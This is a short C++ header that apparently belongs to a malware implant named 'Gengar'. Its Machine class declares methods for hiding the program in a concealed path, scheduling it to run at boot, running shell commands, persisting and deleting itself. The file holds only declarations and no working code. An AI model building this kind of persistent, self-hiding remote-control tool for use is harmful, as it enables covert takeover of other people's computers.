#pragma once

class Machine
{
private:
	void MoveGengarToHiddenPath();
	void ScheduleGengarOnBoot();
	void DeleteGengar();
	void DeleteGengarSchedule();

public:
	Machine();
	std::string RunShellCommand(std::string);
	void Persist();
	void Suicide();
};
